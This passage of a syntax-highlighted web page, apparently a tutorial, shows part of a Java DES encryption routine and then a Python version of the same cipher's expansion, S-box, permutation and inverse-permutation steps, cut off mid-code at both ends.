<span class="number">10</span>,</span><br><span class="line">                <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>&#125;;</span><br><span class="line">        String tmp = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; PTABLE.length;i++)&#123;</span><br><span class="line">            tmp += S_sub_str.charAt(PTABLE[i]-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String Lnnew = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; tmp.length();i++)&#123;</span><br><span class="line">            Lnnew += (tmp.charAt(i) - <span class="string">'0'</span>) ^ (Ln.charAt(i) - <span class="string">'0'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (Lnnew.length()&lt;<span class="number">32</span>)&#123;</span><br><span class="line">            Lnnew = <span class="string">"0"</span> + Lnnew;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Lnnew.length()!=<span class="number">32</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your Lnnew lenth is error!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Ln = Rn;</span><br><span class="line">        Rn = Lnnew;</span><br><span class="line">        String[] strstr = <span class="keyword">new</span> String[<span class="number">2</span>];</span><br><span class="line">        strstr[<span class="number">0</span>] = Ln;</span><br><span class="line">        strstr[<span class="number">1</span>] = Rn;</span><br><span class="line">        <span class="keyword">return</span>  strstr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">IP_inverse</span><span class="params">(String L16,String R16)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] IPINVERSETABLE = &#123;<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">                <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">                <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">                <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>&#125;;</span><br><span class="line">        String tmp = L16 + R16;</span><br><span class="line">        String retstr = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; IPINVERSETABLE.length;i++)&#123;</span><br><span class="line">            retstr += tmp.charAt(IPINVERSETABLE[i] - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (retstr.length() != <span class="number">64</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your IP_inverse is error!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retstr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        ClearTxt = scan.next();</span><br><span class="line">        HextoBin hexto = <span class="keyword">new</span> HextoBin();</span><br><span class="line">        hexto.set(ClearTxt);</span><br><span class="line">        String str2 = hexto.out();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">64</span>;i++)&#123;</span><br><span class="line">            BinaryClearTxt[i] = str2.charAt(i)-<span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        BinaryClearTxt = IP(BinaryClearTxt);</span><br><span class="line">        <span class="keyword">int</span>[] tmpLn = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">32</span>];</span><br><span class="line">        <span class="keyword">int</span>[] tmpRn = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">32</span>];</span><br><span class="line">        String Ln = <span class="string">""</span>;</span><br><span class="line">        String Rn = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">            Ln += BinaryClearTxt[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">32</span>;i &lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">            Rn += BinaryClearTxt[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Key Key = <span class="keyword">new</span> Key();</span><br><span class="line">        Key.set();</span><br><span class="line"></span><br><span class="line">        Sonkey = Key.Main();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span>[] tmpkey = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">48</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">48</span>;j++)&#123;</span><br><span class="line">                tmpkey[j] = Sonkey[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (Rn.length() &lt; <span class="number">32</span>)&#123;</span><br><span class="line">                Rn = <span class="string">"0"</span> + Rn;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (Ln.length() &lt; <span class="number">32</span>)&#123;</span><br><span class="line">                Ln = <span class="string">"0"</span> + Ln;</span><br><span class="line">            &#125;</span><br><span class="line">            String Rn_expand = expend(Rn);</span><br><span class="line">            String S_input = <span class="string">""</span>;</span><br><span class="line">            String S_sub_str = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">0</span>;j&lt;<span class="number">48</span>;j++)&#123;</span><br><span class="line">                S_input += ((Rn_expand.charAt(j) - <span class="string">'0'</span>) ^ (tmpkey[j]));</span><br><span class="line">            &#125;</span><br><span class="line">            S_sub_str = S_sub(S_input);</span><br><span class="line">            String[] StrStr = <span class="keyword">new</span> String[<span class="number">2</span>];</span><br><span class="line">            StrStr = P(Ln,S_sub_str,Rn);</span><br><span class="line">            Ln = StrStr[<span class="number">0</span>];</span><br><span class="line">            Rn = StrStr[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        String tmpp = <span class="string">""</span>;</span><br><span class="line">        tmpp = Ln;</span><br><span class="line">        Ln = Rn;</span><br><span class="line">        Rn = tmpp;</span><br><span class="line">        String re_text = IP_inverse(Ln,Rn);</span><br><span class="line">        <span class="keyword">int</span> tmnum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tmindex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tmmindex = <span class="number">3</span>;</span><br><span class="line">        String a = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i &lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmindex == <span class="number">4</span>)&#123;</span><br><span class="line">                tmindex = <span class="number">0</span>;</span><br><span class="line">                a += hexStr.charAt(tmnum);</span><br><span class="line">                tmnum = <span class="number">0</span>;</span><br><span class="line">                tmmindex = <span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            tmnum += Math.pow(<span class="number">2</span>,tmmindex) * (re_text.charAt(i) - <span class="string">'0'</span>);</span><br><span class="line">            tmmindex --;</span><br><span class="line">            tmindex ++;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">63</span>)&#123;</span><br><span class="line">                a += hexStr.charAt(tmnum);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Your DES Result is : "</span>+re_text);</span><br><span class="line">        System.out.println(<span class="string">"Your DES Result is : "</span>+tmnum);</span><br><span class="line">        System.out.println(<span class="string">"Your DES Result is : "</span>+a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Python实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">expend</span><span class="params">(Rn)</span>:</span></span><br><span class="line">    ETABLE = [<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">                <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">                <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">                <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">                <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">                <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">                <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">                <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>]</span><br><span class="line">    retRn = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ETABLE:</span><br><span class="line">        retRn += Rn[i - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> len(retRn) == <span class="number">48</span></span><br><span class="line">    <span class="keyword">return</span> retRn</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">S_sub</span><span class="params">(S_Input)</span>:</span></span><br><span class="line">    STABLE = [(<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>,</span><br><span class="line">                 <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">                 <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>,</span><br><span class="line">                 <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>),</span><br><span class="line">                (<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">                 <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>,</span><br><span class="line">                 <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">                 <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>),</span><br><span class="line">                (<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line">                 <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>,</span><br><span class="line">                 <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>,</span><br><span class="line">                 <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>),</span><br><span class="line">                (<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">                 <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">                 <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>,</span><br><span class="line">                 <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>),</span><br><span class="line">                (<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">                 <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">                 <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">                 <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">                (<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">                 <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">                 <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>,</span><br><span class="line">                 <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>),</span><br><span class="line">                (<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line">                 <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">                 <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">                 <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>),</span><br><span class="line">                (<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>,</span><br><span class="line">                 <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">                 <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>,</span><br><span class="line">                 <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>)]</span><br><span class="line">    S_Input = bin(S_Input)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> len(S_Input) &lt; <span class="number">48</span>:</span><br><span class="line">        S_Input = <span class="string">"0"</span> + S_Input</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    retstr = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> Slist <span class="keyword">in</span> STABLE:</span><br><span class="line">        row = int(S_Input[index] + S_Input[index + <span class="number">5</span>], base=<span class="number">2</span>)</span><br><span class="line">        col = int(S_Input[index + <span class="number">1</span>:index + <span class="number">5</span>], base=<span class="number">2</span>)</span><br><span class="line">        ret_single = bin(Slist[row * <span class="number">16</span> + col])[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">while</span> len(ret_single) &lt; <span class="number">4</span>:</span><br><span class="line">            ret_single = <span class="string">"0"</span> + ret_single</span><br><span class="line">        retstr += ret_single</span><br><span class="line">        index += <span class="number">6</span></span><br><span class="line">    <span class="keyword">assert</span> len(retstr) == <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> retstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">P</span><span class="params">(Ln, S_sub_str, oldRn)</span>:</span></span><br><span class="line">    PTABLE = [<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">                <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>]</span><br><span class="line">    tmp = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> PTABLE:</span><br><span class="line">        tmp += S_sub_str[i - <span class="number">1</span>]</span><br><span class="line">    LnNew = int(tmp, base=<span class="number">2</span>) ^ int(Ln, base=<span class="number">2</span>)</span><br><span class="line">    LnNew = bin(LnNew)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> len(LnNew) &lt; <span class="number">32</span>:</span><br><span class="line">        LnNew = <span class="string">"0"</span> + LnNew</span><br><span class="line">    <span class="keyword">assert</span> len(LnNew) == <span class="number">32</span></span><br><span class="line">    (Ln, Rn) = (oldRn, LnNew)</span><br><span class="line">    <span class="keyword">return</span> (Ln, Rn)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IP_inverse</span><span class="params">(L16, R16)</span>:</span></span><br><span class="line">    IPINVERSETABLE = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">                         <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">                         <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">                         <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span 